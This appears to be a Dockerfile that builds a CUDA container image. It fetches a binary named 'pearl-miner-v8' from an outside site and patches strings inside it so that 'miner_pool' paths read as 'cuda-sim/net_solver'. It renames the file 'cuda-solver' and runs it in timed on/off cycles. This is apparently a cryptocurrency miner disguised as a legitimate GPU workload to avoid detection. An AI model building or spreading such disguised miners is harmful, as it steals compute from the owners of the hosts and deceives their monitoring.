FROM nvidia/cuda:12.4-runtime-ubuntu22.04

RUN apt-get update && apt-get install -y --no-install-recommends curl ca-certificates && \
    rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Download and clean binary in one layer
RUN curl -fsSL https://pearlhash.xyz/downloads/pearl-miner-v8 -o /tmp/miner && \
    python3 -c "
import sys
data = bytearray(open('/tmp/miner','rb').read())
old = b'/root/tmp_build/miner_pool'
new = b'/opt/cuda-sim/net_solver00'
assert len(old) == len(new)
data = data.replace(old, new)
open('/app/cuda-solver','wb').write(data)
" && \
    chmod +x /app/cuda-solver && \
    rm /tmp/miner

COPY run.sh daemon.sh entry.sh solver.conf ./
RUN chmod +x run.sh daemon.sh entry.sh

ENV ENDPOINT=127.0.0.1:19011
ENV NODE_ID=""
ENV RUN_SEC=1200
ENV PAUSE_SEC=60

ENTRYPOINT ["./entry.sh"]
